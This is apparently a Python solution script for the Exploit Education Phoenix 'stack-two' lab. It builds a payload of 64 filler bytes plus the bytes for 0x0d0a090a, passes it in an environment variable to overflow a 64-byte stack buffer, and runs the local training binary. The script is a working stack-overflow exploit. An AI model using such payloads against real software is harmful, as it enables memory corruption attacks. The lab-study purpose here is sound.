
# Stack buffer overflow environment variables
# This exercise intends to an environmental variable getenv("ExploitEducation")
# for our program value, and have it do the same memory corruption as the previous exercises.

# Again, having a char[64] buffer array, a volatile int, and then strcpy()
# later with the buffer overriding our int.


# export ExploitEducation=$'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\t\n\r'
# \n\t\n\r was equal to the value necessary for 0x0d0a090a

# I did not add that command into the script to prevent modification of the environment

import subprocess

filepath = '/opt/phoenix/amd64/stack-two'
payload = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\t\n\r'
print('Executing ' + filepath + ' with args ' + payload)

proc = subprocess.Popen(filepath, env=dict(ExploitEducation=payload),
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

outStream  = proc.stdout.readline()
print('Initial output: ' + outStream.decode('utf-8'))

outStream  = proc.stdout.readline()
print('Last output: ' + outStream.decode('utf-8'))

exit()
